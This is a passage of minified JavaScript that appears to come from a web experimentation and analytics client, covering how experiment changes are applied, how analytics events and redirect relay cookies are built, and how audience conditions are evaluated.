          _ = e(2174);
        e(7246).initialize();
        var w = u("ActionError");
        function y(n, t, e) {
          if (p.getActionState(t.id)) {
            var o = p.getChangeApplier(n.id, t.id);
            if (i.isUndefined(o)) {
              var a = {
                changeId: n.id,
                actionId: t.id,
                changeApplier: _.create(n, t, e)
              };
              f.dispatch(r.SET_CHANGE_APPLIER, a);
            } else l.warn("Action / Attempted to prepare a change which is already being applied: ", n);
          } else l.warn("Action / Attempted to prepare change for inactive action: ", t);
        }
        function b(n, t, e, r) {
          if (!i.includes(r, t)) {
            if (!n[String(t)]) {
              var u = g.getChange(t);
              if (!u) {
                var s = "Change with id " + t + " is absent";
                return r.length && (s += " but listed as a dependency for " + r[r.length - 1]), void l.warn(s);
              }
              n[String(t)] = new d(function (s) {
                var f = i.map(u.dependencies || [], function (i) {
                  return b(n, i, e, r.concat([t]));
                });
                if (u.src) {
                  var h = "change_" + u.src,
                    m = a.makeAsyncRequest(h, function () {
                      return v.addScriptAsync("https://cdn.optimizely.com/public/17202440929/data" + u.src, function () {
                        a.resolveRequest(h);
                      });
                    }).then(function () {
                      var n = g.getChange(u.id);
                      n || o.emitError(new w("Failed to load async change from src: " + u.src)), y(n, e, c.now());
                    });
                  f.push(m);
                }
                d.all(f).then(function () {
                  var n = c.now(),
                    i = p.getChangeApplier(t, e.id);
                  return i ? (l.debug("Action / Applying change:", u), i.apply().then(function (t) {
                    t ? l.log(t) : l.debug("Action / Applied change for the first time in " + (c.now() - n) + "ms:", u), s();
                  })) : (l.debug("Action / Not applying change ", t, " - No changeApplier found."), void s());
                })["catch"](function (n) {
                  l.error("Action / Failed to apply change:", u, n), s();
                });
              });
            }
            return n[String(t)];
          }
          l.error("Change with id " + t + " has circular dependencies: " + r.concat(t));
        }
        t.prepareAction = function (n) {
          l.debug("Action / Preparing:", n), f.dispatch(r.ACTION_EXECUTED, {
            actionId: n.id,
            sessionId: m.getSessionId(),
            layerId: n.layerId,
            pageId: n.pageId,
            timestamp: c.now(),
            activationId: h.getActivationId()
          });
          var t = c.now();
          i.forEach(n.changeSet, function (e) {
            var o = i.isObject(e) ? e.id : e,
              a = g.getChange(o);
            a || (f.dispatch(r.ADD_CHANGE, e), a = g.getChange(e.id)), a.src || y(a, n, t);
          });
        }, t.executePreparedAction = function (n) {
          l.debug("Action / Executing:", n);
          var t = {},
            e = i.map(n.changeSet, function (e) {
              var r = i.isObject(e) ? e.id : e;
              return b(t, r, n, []);
            });
          return d.all(e).then(function () {
            l.debug("changes for action id=" + n.id + " applied");
          });
        };
      },
      7246: function (n, t, e) {
        var i = e(8235),
          r = e(4041).get("stores/directive");
        function o() {
          ("interactive" === document.readyState || "complete" === document.readyState) && (t.domReadyTime = Date.now());
        }
        t.domReadyTime = null, t.initialize = function () {
          o(), document.addEventListener("readystatechange", o, !0);
        }, t.isTimedOut = function (n) {
          var e = Date.now();
          if (!t.domReadyTime || !n) return !1;
          var o = Math.max(n, t.domReadyTime);
          return r.isEditor() && (o = t.domReadyTime), !(e - o < i.SELECTOR_POLLING_MAX_TIME);
        };
      },
      9126: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(7989),
          a = e(5434),
          u = e(3792),
          c = e(5172),
          s = e(4041),
          f = e(6954),
          l = e(8964),
          d = e(1852),
          v = e(4658),
          h = e(7356),
          p = e(1372),
          g = e(4797),
          m = e(4604),
          _ = e(2678),
          w = (e(9e3), e(8398).Promise),
          y = e(74),
          b = e(6928),
          E = e(9418),
          I = e(9612),
          A = e(1243),
          T = s.get("stores/client_metadata"),
          S = s.get("stores/global"),
          k = s.get("stores/session"),
          R = s.get("stores/view"),
          N = s.get("stores/plugins"),
          D = s.get("stores/layer"),
          C = s.get("stores/layer_data"),
          O = s.get("stores/observed_redirect"),
          x = s.get("stores/pending_redirect"),
          P = s.get("stores/visitor"),
          M = s.get("stores/directive"),
          L = s.get("stores/event_data"),
          V = s.get("stores/visitor_id");
        function F(n, t) {
          return i.extend({}, n, {
            isLayerHoldback: t,
            isGlobalHoldback: !1,
            clientName: i.isNull(n.clientName) ? c.NAME : n.clientName,
            integrationStringVersion: i.isNull(n.integrationStringVersion) ? 1 : n.integrationStringVersion,
            anonymizeIP: i.isNull(S.getAnonymizeIP()) ? void 0 : S.getAnonymizeIP(),
            activationId: S.getActivationId(),
            decisionTicketAudienceIds: [],
            sessionId: k.getSessionId(),
            activeViewStates: [],
            userFeatures: j(P.getVisitorProfile()),
            layerStates: D.getLayerStatesForAnalytics()
          });
        }
        function U(n) {
          var t = y.getReferrer() || f.getReferrer();
          return {
            eventId: A.generate(),
            timestamp: u.now(),
            revision: S.getRevision(),
            clientName: T.getClientName(),
            clientVersion: T.getClientVersion(),
            projectId: S.getProjectId(),
            accountId: S.getAccountId(),
            activationId: S.getActivationId(),
            sessionId: k.getSessionId(),
            isGlobalHoldback: S.isGlobalHoldback(),
            namespace: S.getNamespace(),
            referrer: t,
            visitorId: V.getRandomId(),
            activeViewStates: n.activeViewStates,
            layerStates: n.layerStates,
            userFeatures: j(n.visitorProfile)
          };
        }
        function z(n) {
          var t, e;
          return n.pageId ? (t = n.pageId, (e = R.getViewState(t)) && e.isActive ? e.metadata : {}) : {};
        }
        function j(n) {
          var t = N.getAllPlugins(l.PluginTypes.visitorProfileProviders),
            e = i.filter(t, {
              shouldTrack: !0
            }),
            r = {
              id: null,
              type: null,
              name: "",
              value: null,
              shouldIndex: !0
            };
          return i.reduce(e, function (t, e) {
            try {
              var o = e.provides,
                a = n[o],
                u = [];
              if (!i.isUndefined(a)) {
                i.isObject(a) ? u = i.map(a, function (n, t) {
                  var e = i.isObject(n) ? n : {
                    value: n
                  };
                  return i.extend({}, {
                    type: o,
                    name: t
                  }, e);
                }) : u.push({
                  type: o,
                  value: a
                });
                var c = i(u).map(function (n) {
                  return i.pick(i.extend({}, r, n), i.keys(r));
                }).filter(function (n) {
                  return !!n.value;
                }).value();
                t = t.concat(c);
              }
            } catch (s) {
              _.warn("Error evaluating userFeature against visitorProfile:", s);
            }
            return t;
          }, []);
        }
        function G(n, t, e) {
          var r = function (n, t) {
            var e = [];
            return i.each(N.getAllPlugins(l.PluginTypes.analyticsTrackers), function (i, r) {
              if (i[n] && (!t || !i[t])) try {
                e.push({
                  name: r,
                  hookFn: s.evaluate(i[n])
                });
              } catch (o) {
                _.error(o);
              }
            }), e;
          }(n, e);
          _.debug("Found " + r.length + " analytics integrations defining a " + n + " hook"), _.debug("Calling each with data: ", t), i.each(r, function (n) {
            try {
              _.debug("Calling plugin: " + n.name), n.hookFn(t), _.debug("Called plugin: " + n.name);
            } catch (e) {
              _.error(e);
            }
          });
        }
        function B(n, t, e) {
          var r = function (n, t) {
            0;
            var e = [];
            return i.each(N.getAllPlugins(l.PluginTypes.analyticsTrackers), function (r, o) {
              i.includes(t, r[n]) && e.push({
                name: o,
                hookFn: r.trackLayerDecision
              });
            }), e;
          }(n, t);
          _.debug("Found " + r.length + " analytics integrations  defining a trackLayerDecision " + n + " timing of " + t.join("|")), _.debug("Calling each with data: ", e), i.each(r, function (n) {
            try {
              _.debug("Calling plugin: " + n.name), n.hookFn(e), _.debug("Called plugin: " + n.name);
            } catch (t) {
              _.error(t);
            }
          });
        }
        t.trackClientActivation = function () {
          if (M.shouldSendTrackingData()) {
            var n,
              t = (n = U({
                activeViewStates: [],
                visitorProfile: P.getVisitorProfile(),
                layerStates: D.getLayerStatesForAnalytics()
              }), i.extend(n, {
                eventTags: {}
              }));
            return G("onClientActivation", t), t;
          }
        }, t.trackCustomEvent = function (n, t, e) {
          t = t || {}, e || (e = L.getByApiName(n));
          var r = function (n, t, e) {
              var r = U({
                  activeViewStates: R.getActiveViewStates(),
                  visitorProfile: P.getVisitorProfile(),
                  layerStates: D.getLayerStatesForAnalytics()
                }),
                o = e && e.pageId ? z(e) : R.getActiveViewTags(),
                a = i.extend({}, o, t),
                u = e && e.category ? e.category : d.OTHER;
              return i.extend(r, {
                eventEntityId: e && e.id,
                eventApiName: n,
                eventCategory: u,
                eventTags: a
              });
            }(n, t, e),
            u = {
              name: n,
              type: p.CUSTOM,
              category: r.eventCategory,
              tags: i.omit(r.eventTags, "revenue")
            };
          if (i.isUndefined(t.revenue) || (u.revenue = t.revenue), o.emitAnalyticsEvent({
            name: e ? e.name || e.apiName : n,
            apiName: e ? e.apiName : void 0,
            type: p.CUSTOM,
            tags: i.omit(r.eventTags, "revenue"),
            category: r.eventCategory,
            metrics: u.revenue ? {
              revenue: u.revenue
            } : {}
          }, !M.shouldSendTrackingData()), M.shouldSendTrackingData()) return a.addEvent(u), G("onCustomEvent", r), r;
        }, t.trackDecisionEvent = function (n, t, e) {
          e || (e = C.get(n.layerId));
          var o = A.generate();
          g.dispatch(r.RECORD_LAYER_DECISION_EVENT_ID, {
            layerId: n.layerId,
            pageId: t.pageId,
            decisionId: o
          });
          var a = function (n, t, e, r) {
              var o = null,
                a = null,
                c = null;
              if (t.experimentId) {
                var s = i.find(r.experiments, {
                  id: t.experimentId
                });
                if (s && (o = s.name || null, c = s.integrationSettings, t.variationId)) {
                  var l = i.find(s.variations, {
                    id: t.variationId
                  });
                  l && (a = l.name || null);
                }
              }
              var d = y.getReferrer() || f.getReferrer();
              return {
                sessionId: k.getSessionId(),
                decisionTicketAudienceIds: e.audienceIds,
                visitorId: V.getRandomId(),
                decisionId: n,
                activationId: S.getActivationId(),
                namespace: S.getNamespace(),
                timestamp: u.now(),
                pageId: e.pageId || null,
                variationId: t.variationId,
                variationName: a,
                experimentId: t.experimentId,
                experimentName: o,
                layerId: t.layerId,
                layerName: r.name,
                layerPolicy: r.policy,
                accountId: S.getAccountId(),
                projectId: S.getProjectId(),
                revision: String(S.getRevision()),
                clientName: T.getClientName(),
                clientVersion: T.getClientVersion(),
                referrer: d,
                integrationStringVersion: r.integrationStringVersion || 1,
                integrationSettings: i.extend({}, r.integrationSettings, c)
              };
            }(o, n, t, e),
            c = x.isExpectingRedirect(),
            s = x.getLayerId(),
            l = m.description(e);
          if (c && s === e.id && (b.persist(a, "COOKIE"), _.log("Relaying decision for redirect Campaign", l)), M.shouldSendTrackingData()) {
            var d = F(a, n.isLayerHoldback);
            if (c && s === e.id) {
              var v = I.TrackLayerDecisionTimingFlags.preRedirectPolicy;
              d.timing = v, B(v, [I.PreRedirectPolicies.PERSIST_BEFORE_AND_TRACK_DURING_REDIRECT], d), _.log("Called trackLayerDecision for redirect Campaign", l, d);
            } else {
              v = I.TrackLayerDecisionTimingFlags.nonRedirectPolicy;
              d.timing = v, B(v, [I.NonRedirectPolicies.TRACK_IMMEDIATELY], d), _.log("Called trackLayerDecision for non-redirect Campaign", l, d);
            }
          } else _.log("Analytics / Not tracking decision for Campaign", m.description(e));
        }, t.trackPostRedirectDecisionEvent = function () {
          if (!M.shouldSendTrackingData() || O.hasTracked()) return w.resolve();
          var n = O.get();
          if (!n) return w.resolve();
          var t = F(n, !1),
            e = I.TrackLayerDecisionTimingFlags.postRedirectPolicy;
          t.timing = e, B(e, [I.PostRedirectPolicies.TRACK_IMMEDIATELY], t);
          var i = new w(function (n) {
              var t = v.on({
                filter: {
                  type: h.TYPES.LIFECYCLE,
                  name: "originsSynced"
                },
                handler: function () {
                  n(), v.off(t);
                }
              });
            }),
            o = E.makeTimeoutPromise(1e3);
          return w.race([i, o]).then(function () {
            _.log("Calling trackers after successful sync");
          }, function (n) {
            _.warn("Calling trackers after failed sync:", n);
          }).then(function () {
            (t = F(n, !1)).timing = I.TrackLayerDecisionTimingFlags.postRedirectPolicy, B(I.TrackLayerDecisionTimingFlags.postRedirectPolicy, [I.PostRedirectPolicies.TRACK_AFTER_SYNC], t), g.dispatch(r.REGISTER_TRACKED_REDIRECT_DATA);
          })["catch"](function (n) {
            _.error("Error when calling trackers after sync:", n);
          });
        }, t.trackClickEvent = function (n) {
          var t = function (n) {
              var t = U({
                  activeViewStates: R.getActiveViewStates(),
                  visitorProfile: P.getVisitorProfile(),
                  layerStates: D.getLayerStatesForAnalytics()
                }),
                e = n.config && n.config.selector ? n.config.selector : n.eventFilter.selector,
                r = n.apiName,
                o = n.category || d.OTHER,
                a = n.id,
                u = z(n);
              return i.extend(t, {
                eventApiName: r,
                eventCategory: o,
                eventEntityId: a,
                eventTags: u,
                pageId: n.pageId,
                selector: e
              });
            }(n),
            e = {
              name: n.apiName,
              type: n.eventType,
              category: t.eventCategory,
              tags: t.eventTags
            };
          if (o.emitAnalyticsEvent({
            name: n.name || n.apiName,
            apiName: n ? n.apiName : void 0,
            type: n.eventType,
            category: t.eventCategory,
            tags: t.eventTags,
            metrics: {}
          }, !M.shouldSendTrackingData()), M.shouldSendTrackingData()) return a.addEvent(e), G("onClickEvent", t), t;
        }, t.trackViewActivation = function (n, t) {
          if (t || (t = R.getViewState(n.id)), t.isActive) {
            var e = function (n, t) {
              var e = U({
                activeViewStates: R.getActiveViewStates(),
                visitorProfile: P.getVisitorProfile(),
                layerStates: D.getLayerStatesForAnalytics()
              });
              return i.extend(e, {
                pageId: n.id,
                pageApiName: n.apiName,
                viewCategory: n.category,
                eventTags: t.metadata
              });
            }(n, t);
            if (o.emitAnalyticsEvent({
              name: n.name || e.pageApiName,
              apiName: e.pageApiName,
              type: p.PAGEVIEW,
              category: e.viewCategory,
              tags: e.eventTags,
              metrics: {}
            }, !M.shouldSendTrackingData()), M.shouldSendTrackingData()) return a.addEvent({
              name: e.pageApiName,
              type: p.PAGEVIEW,
              category: e.viewCategory,
              tags: e.eventTags
            }), g.dispatch(r.TRACK_VIEW_ACTIVATED_EVENT, {
              pageId: n.id,
              eventData: e
            }), G("onPageActivated", e), e;
          } else _.debug("Inactive view passed to `trackViewActivation`");
        };
      },
      6928: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(8718),
          a = e(7989),
          u = e(4041),
          c = e(8964),
          s = e(4797),
          f = e(2678),
          l = e(9612),
          d = u.get("stores/plugins"),
          v = ".",
          h = [{
            name: "sessionId",
            relayName: "s"
          }, {
            name: "decisionTicketAudienceIds",
            relayName: "as",
            valueToValueString: function (n) {
              return i.map(n, encodeURIComponent).join(",");
            },
            encodeValueString: i.identity,
            decodeValueString: i.identity,
            valueFromValueString: function (n) {
              return i.map(n.split(","), o.safeDecodeURIComponent);
            }
          }, {
            name: "decisionId",
            relayName: "d"
          }, {
            name: "activationId",
            relayName: "aId"
          }, {
            name: "pageId",
            relayName: "vId",
            isNullable: !0
          }, {
            name: "variationId",
            relayName: "v",
            isNullable: !0
          }, {
            name: "referrer",
            relayName: "r"
          }, {
            name: "timestamp",
            relayName: "t",
            valueFromValueString: Number
          }, {
            name: "visitorId",
            relayName: "i"
          }, {
            name: "projectId",
            relayName: "p"
          }, {
            name: "revision",
            relayName: "n"
          }, {
            name: "clientName",
            relayName: "cN",
            isNullable: !0
          }, {
            name: "clientVersion",
            relayName: "cV"
          }, {
            name: "namespace",
            relayName: "ns"
          }, {
            name: "accountId",
            relayName: "a"
          }, {
            name: "layerId",
            relayName: "l"
          }, {
            name: "layerName",
            relayName: "lN",
            isNullable: !0
          }, {
            name: "layerPolicy",
            relayName: "lP"
          }, {
            name: "experimentId",
            relayName: "x",
            isNullable: !0
          }, {
            name: "experimentName",
            relayName: "xN",
            isNullable: !0
          }, {
            name: "variationName",
            relayName: "vN",
            isNullable: !0
          }, {
            name: "integrationStringVersion",
            relayName: "isv",
            valueFromValueString: Number,
            isNullable: !0
          }, {
            name: "integrationSettings",
            relayName: "iS",
            isMulti: !0,
            valueToValueString: function (n, t) {
              var e = null;
              if (n) {
                var r = d.getPlugin(c.PluginTypes.analyticsTrackers, t);
                if (r && i.isFunction(r.serializeSettings)) try {
                  e = r.serializeSettings(n);
                } catch (o) {
                  f.warn("Analytics / Failed to persist integrationSettings for plugin:", t, o);
                }
              }
              return e;
            },
            valueFromValueString: function (n, t) {
              var e = null,
                r = d.getPlugin(c.PluginTypes.analyticsTrackers, t);
              if (r && i.isFunction(r.deserializeSettings)) try {
                e = r.deserializeSettings(n);
              } catch (o) {
                f.warn("Analytics / Failed to persist integrationSettings for plugin:", t, o);
              }
              return e;
            },
            isNullable: !0
          }],
          p = {},
          g = {};
        i.forEach(h, function (n) {
          p[n.name] = n, g[n.relayName] = n;
        }), t.persist = function (n, t) {
          t === l.RedirectRelayMedia.COOKIE ? function (n) {
            try {
              var t = function (n) {
                var t = [],
                  e = i.reduce(n, function (n, e, r) {
                    var o = p[r];
                    return o ? (o.isMulti ? i.forEach(e, function (t, e) {
                      t = o.valueToValueString ? o.valueToValueString(t, e) : String(t), i.isNull(t) || (t = (o.encodeValueString || encodeURIComponent)(t), n.push(encodeURIComponent(o.relayName + v + e) + "=" + t));
                    }) : i.isNull(e) || (e = (o.valueToValueString || String)(e), e = (o.encodeValueString || encodeURIComponent)(e), n.push(o.relayName + "=" + e)), n) : (t.push(r), n);
                  }, []);
                if (t.length) throw new Error("Relay / Don't know how to relay some fields: " + t);
                return e.sort(), e.join("&");
              }(n);
            } catch (e) {
              return f.error("Relay / Error computing redirect relay cookie: ", e), void a.emitError(e);
            }
            f.debug("Relay / Setting redirect relay cookie:", t);
            try {
              o.set(c.COOKIES.REDIRECT, t, {
                maxAge: 5,
                encodeValue: !1
              });
            } catch (r) {
              f.error("Relay / Failed to set redirect relay cookie", r), a.emitError(r);
            }
          }(n) : f.error("Relay / Unsupported redirect relay medium: " + t);
        }, t.load = function (n) {
          if (n || (n = function () {
            var n = o.get(c.COOKIES.REDIRECT, !1);
            if (n) return f.log("Relay / Found redirect cookie:", n), n;
          }()), n) {
            var t = function (n) {
              var t = {},
                e = n.split("&");
              return i.forEach(e, function (n) {
                var e = n.split("=");
                if (2 === e.length) {
                  var r = o.safeDecodeURIComponent(e[0]),
                    u = g[r];
                  if (u || (u = i.find(h, function (n) {
                    return n.isMulti && 0 === r.indexOf(n.relayName + v);
                  }))) {
                    var c = e[1];
                    try {
                      if (u.isMulti) {
                        t[u.name] = t[u.name] || {};
                        var s = r.substring(u.relayName.length + v.length);
                        c = (u.decodeValueString || o.safeDecodeURIComponent)(c), c = (u.valueFromValueString || i.identity)(c, s), t[u.name][s] = c;
                      } else c = (u.decodeValueString || o.safeDecodeURIComponent)(c), c = (u.valueFromValueString || i.identity)(c), t[u.name] = c;
                    } catch (l) {
                      return f.warn("Relay / Skipping segment due to decode or parse error:", n, l), void a.emitError(l);
                    }
                  } else f.warn("Relay / Skipping segment with unknown field identifier:", n, r);
                } else f.warn("Relay / Skipping invalid segment:", n);
              }), t;
            }(n);
            if (t) {
              var e = [];
              if (i.forEach(h, function (n) {
                (i.isNull(t[n.name]) || i.isUndefined(t[n.name])) && (n.isNullable ? t[n.name] = null : (delete t[n.name], e.push(n.name)));
              }), !e.length) return s.dispatch(r.LOAD_REDIRECT_DATA, t), s.dispatch(r.ADD_CLEANUP_FN, {
                lifecycle: c.Lifecycle.postVisitorProfileLoad,
                cleanupFn: function () {
                  var n, e;
                  e = (n = t).pageId || void 0, s.dispatch(r.RECORD_LAYER_DECISION, {
                    layerId: n.layerId,
                    decision: {
                      layerId: n.layerId,
                      experimentId: n.experimentId,
                      variationId: n.variationId,
                      isLayerHoldback: !1
                    },
                    decisionTicket: {
                      audienceIds: n.decisionTicketAudienceIds,
                      bucketingId: n.visitorId,
                      globalHoldback: 0,
                      preferredVariationMap: void 0,
                      pageId: e,
                      activationId: n.activationId
                    },
                    sessionId: n.sessionId,
                    activationId: n.activationId,
                    timestamp: n.timestamp,
                    revision: n.revision,
                    namespace: n.namespace,
                    pageId: e
                  }), s.dispatch(r.RECORD_LAYER_DECISION_EVENT_ID, {
                    layerId: n.layerId,
                    pageId: e,
                    decisionId: n.decisionId
                  }), s.dispatch(r.ACTION_EXECUTED, {
                    sessionId: n.sessionId,
                    layerId: n.layerId,
                    pageId: n.pageId,
                    timestamp: n.timestamp,
                    activationId: n.activationId
                  });
                }
              }), t;
              f.error("Relay / Observed redirect data with missing fields:", e);
            }
          }
        };
      },
      7989: function (n, t, e) {
        var i = e(4658);
        t.emitError = function (n, t, e) {
          i.emit({
            type: "error",
            name: n.name || "Error",
            data: {
              error: n,
              metadata: t
            }
          }, e || !1, !0);
        }, t.emitInternalError = function (n, e) {
          t.emitError(n, e, !0);
        }, t.emitAnalyticsEvent = function (n, t) {
          var e = {
            type: "analytics",
            name: "trackEvent",
            data: n
          };
          i.emit(e, t);
        };
      },
      6621: function (n, t, e) {
        var i = e(9576),
          r = e(6227),
          o = e(9196),
          a = e(2678),
          u = e(1685);
        function c(n, t) {
          var e = "function" == typeof n ? n(t) : n;
          return "string" == typeof e && (e = [e]), i.isArray(e) ? e : (a.warn("Couldn't determine fieldsNeeded for matcher; assuming []"), []);
        }
        function s(n) {
          return n.name ? n.name + " (" + n.id + ")" : n.id;
        }
        t.isInAudience = function (n, t, e) {
          var u,
            f = function (n, t) {
              return function (e) {
                var r = e.type,
                  u = t[r];
                if (!u) throw new Error("Audience / No matcher found for type=" + r);
                if (u.fieldsNeeded) for (var s = c(u.fieldsNeeded, e), f = 0; f < s.length; f++) {
                  var l = s[f],
                    d = o.getFieldValue(n, l);
                  if (i.isUndefined(d)) return void a.debug("Audience / Required field", l, "for type", r, "has no value");
                }
                a.debug("Matching condition:", e, "to values:", n);
                var v = u.match(n, e);
                if (!i.isUndefined(v)) return !!v;
              };
            }(n, e);
          a.groupCollapsed("Checking audience", t.name, t.id, t), a.debug("Visitor Profile:", n);
          try {
            var l = r.evaluate(t.conditions, f);
          } catch (d) {
            u = d, l = !1;
          }
          return a.groupEnd(), u && a.error("Audience / Error evaluating audience", s(t), ":", u), a.log("Is " + (l ? "in" : "NOT in") + " audience:", s(t)), l;
        }, t.requiredAudienceFieldsForConditions = function f(n, t) {
          var e = {};
          return i.each(n, function (n) {
            if (i.isArray(n)) i.extend(e, f(n, t));else if (i.isObject(n)) {
              var r = t[n.type];
              if (r) {
                var o = c(r.fieldsNeeded, n);
                i.each(o, function (n) {
                  e[u.serializeFieldKey(n)] = n;
                });
              }
            }
          }), e;
        };
      },
      2657: function (n, t) {
        t.FIELDS = {
          NAME: "n",
          TIME: "t",
          TYPE: "y",
          CATEGORY: "c",
          REVENUE: "r",
          SESSION_ID: "s",
          OPTIONS: "o",
          SESSION_INDEX: "si"
        }, t.FIELDS_V0_2 = {
          name: t.FIELDS.NAME,
          time: t.FIELDS.TIME,
          type: t.FIELDS.TYPE,
          category: t.FIELDS.CATEGORY,
          tags: t.FIELDS.OPTIONS,
          session_index: t.FIELDS.SESSION_INDEX
        };
      },
      5093: function (n, t, e) {
        var i = e(9576),
          r = e(2657),
          o = e(9196).getFieldValue,
          a = e(7751);
        function u(n, t, e, o, a) {
          this[r.FIELDS.NAME] = n, this[r.FIELDS.TYPE] = t, i.isString(e) && e.trim().length > 0 && (this[r.FIELDS.CATEGORY] = e), o && i.keys(o).length > 0 && (this[r.FIELDS.OPTIONS] = o), i.isUndefined(a) || (this[r.FIELDS.REVENUE] = a);
        }
        function c(n, t, e, o) {
          this.eventBase = n, this[r.FIELDS.TIME] = t, i.isUndefined(e) || (this[r.FIELDS.SESSION_ID] = e), i.isUndefined(o) || (this[r.FIELDS.SESSION_INDEX] = o);
        }
        t.x = u, u.prototype.digest = function () {
          var n = function (n, t) {
              return encodeURIComponent(n) + "=" + encodeURIComponent(t);
            },
            t = [];
          if (t.push(n(r.FIELDS.NAME, this[r.FIELDS.NAME])), t.push(n(r.FIELDS.TYPE, this[r.FIELDS.TYPE])), this[r.FIELDS.CATEGORY] && t.push(n(r.FIELDS.CATEGORY, this[r.FIELDS.CATEGORY])), this[r.FIELDS.REVENUE] && t.push(n(r.FIELDS.REVENUE, this[r.FIELDS.REVENUE])), !this[r.FIELDS.OPTIONS]) return t.join("&");
          var e = this[r.FIELDS.OPTIONS] || {},
            o = i.filter(i.keys(e), function (n) {
              return e.hasOwnProperty(n);
            });
          o = o.sort();
          for (var a = 0; a < o.length; a++) t.push(n(o[a], e[o[a]]));
          return t.join("&");
        }, u.prototype.hash = function () {
          return this.hash_ || (this.hash_ = a.hashToHex(a.toByteString(this.digest()), a.Seed.BEHAVIOR_EVENT)), this.hash_;
        }, u.prototype.setHash = function (n) {
          this.hash_ = n;
        }, u.prototype.reHash = function () {
          this.hash_ = null, this.hash();
        }, u.prototype.equals = function (n) {
          if (this.hash() !== n.hash() || this[r.FIELDS.NAME] !== n[r.FIELDS.NAME] || this[r.FIELDS.TYPE] !== n[r.FIELDS.TYPE] || this[r.FIELDS.CATEGORY] !== n[r.FIELDS.CATEGORY] || this[r.FIELDS.REVENUE] !== n[r.FIELDS.REVENUE]) return !1;
          var t = this[r.FIELDS.OPTIONS] || {},
            e = n[r.FIELDS.OPTIONS] || {},
            o = i.filter(i.keys(t), function (n) {
              return t.hasOwnProperty(n);
            }),
            a = i.filter(i.keys(e), function (n) {
              return e.hasOwnProperty(n);
            });
          if (o.length !== a.length) return !1;
          for (var u = 0; u < o.length; u++) {
            var c = o[u];
            if (!e.hasOwnProperty(c) || t[c] !== e[c]) return !1;
          }
          return !0;
        }, u.prototype.getValueOrDefault = function (n, t) {
          var e = o(this, n);
          return i.isUndefined(e) ? t : e;
        }, u.prototype.setFieldValue = function (n, t) {
          n !== r.FIELDS.NAME && n !== r.FIELDS.TYPE && n !== r.FIELDS.CATEGORY && n !== r.FIELDS.REVENUE && n !== r.FIELDS.OPTIONS || (this[n] = t, this.reHash());
        }, t.j = c, c.prototype.getValueOrDefault = function (n, t) {
          if (0 === n.length) return this;
          var e = {};
          e[r.FIELDS.TIME] = this[r.FIELDS.TIME], e[r.FIELDS.SESSION_ID] = this[r.FIELDS.SESSION_ID], e[r.FIELDS.SESSION_INDEX] = this[r.FIELDS.SESSION_INDEX];
          var a = o(e, n);
          return i.isUndefined(a) ? this.eventBase.getValueOrDefault(n, t) : a;
        }, c.prototype.setFieldValue = function (n, t) {
          n === r.FIELDS.TIME || n === r.FIELDS.SESSION_ID || n === r.FIELDS.SESSION_INDEX ? this[n] = t : this.eventBase.setFieldValue(n, t);
        };
        var s = {
          n: "name",
          y: "type",
          c: "category",
          r: "revenue",
          s: "session_id",
          o: "tags",
          si: "session_index"
        };
        c.prototype.readableEvent = function () {
          var n,
            t,
            e = function (n) {
              return i.isString(n) ? '"' + n + '"' : n;
            },
            o = this,
            a = [];
          i.each([r.FIELDS.NAME, r.FIELDS.TYPE, r.FIELDS.CATEGORY, r.FIELDS.REVENUE, r.FIELDS.SESSION_ID], function (r) {
            n = s[r], t = o.getValueOrDefault([r]), i.isUndefined(t) || a.push(n + ": " + e(t));
          });
          var u = [];
          if (n = s[r.FIELDS.OPTIONS], t = o.getValueOrDefault([r.FIELDS.OPTIONS]), i.isUndefined(t) || (i.each(t, function (n, t) {
            u.push(t + ": " + String(e(n)));
          }), a.push(n + ": {\n\t\t" + u.join(",\n\t\t") + "\n\t}")), t = o.getValueOrDefault([r.FIELDS.TIME]), i.isNumber(t) && (t = e(new Date(t).toString())), !i.isUndefined(t)) {
            a.push("timestamp: " + t);
          }
          return "{\n\t" + a.join(",\n\t") + "\n}";
        }, c.prototype.toObject = function (n) {
          var t,
            e,
            o = {},
            a = this;
          i.each([r.FIELDS.NAME, r.FIELDS.TYPE, r.FIELDS.CATEGORY, r.FIELDS.REVENUE, r.FIELDS.OPTIONS, r.FIELDS.SESSION_INDEX], function (n) {
            t = s[n], e = a.getValueOrDefault([n], n === r.FIELDS.OPTIONS ? {} : void 0), i.isUndefined(e) || (o[t] = e);
          });
          var u = s[r.FIELDS.OPTIONS],
            c = s[r.FIELDS.REVENUE];
          if (n && n.revenueAsTag && o[c] && (o[u] = o[u] || {}, o[u][c] = o[c], delete o[c]), e = a.getValueOrDefault([r.FIELDS.TIME]), i.isNumber(e)) if (n && n.timeAsTimestamp) {
            o.timestamp = new Date(e);
          } else {
            o.time = e;
          }
          return o;
        };
      },
      5434: function (n, t, e) {
        var i = e(9314);
        t.initializeStore = i.initialize, t.addEvent = i.addEvent, t.getEvents = i.getEvents, t.getEventCount = i.getEventCount;
      },
      2289: function (n, t, e) {
        var i = e(5093).j,
          r = e(3792),
          o = e(2657),
          a = e(5093).x;
        t.CURRENT_SESSION_INDEX = 0;
        var u = 18e5;
        function c(n, e) {
          var i;
          i = t.isInSameSession(n, e) ? n.getValueOrDefault([o.FIELDS.SESSION_ID]) : e.getValueOrDefault([o.FIELDS.TIME]), e.setFieldValue(o.FIELDS.SESSION_ID, i);
        }
        function s(n, e, i) {
          var r,
            a = n.getValueOrDefault([o.FIELDS.SESSION_INDEX]);
          r = t.isInSameSession(e, n) ? a : i ? a + 1 : a - 1, e.setFieldValue(o.FIELDS.SESSION_INDEX, r);
        }
        t.isInSameSession = function (n, t) {
          var e = n.getValueOrDefault([o.FIELDS.TIME], 0),
            i = t.getValueOrDefault([o.FIELDS.TIME], 0);
          return Math.abs(e - i) < u;
        }, t.updateSessionId = function (n, t) {
          if (n) {
            var e = n.getValueOrDefault([o.FIELDS.TIME]),
              r = n.getValueOrDefault([o.FIELDS.SESSION_ID]),
              u = t.getValueOrDefault([o.FIELDS.TIME]);
            e = "number" != typeof e ? u - 36e5 : e, r = "number" != typeof r ? e : r, c(n = new i(new a("", ""), e, r), t);
          } else t.setFieldValue(o.FIELDS.SESSION_ID, t.getValueOrDefault([o.FIELDS.TIME]));
        }, t.updateSessionIndex = function (n, t) {
          if (n) {
            var e = n.getValueOrDefault([o.FIELDS.TIME]),
              r = n.getValueOrDefault([o.FIELDS.SESSION_INDEX]),
              u = t.getValueOrDefault([o.FIELDS.TIME]),
              c = n.getValueOrDefault([o.FIELDS.SESSION_ID]);
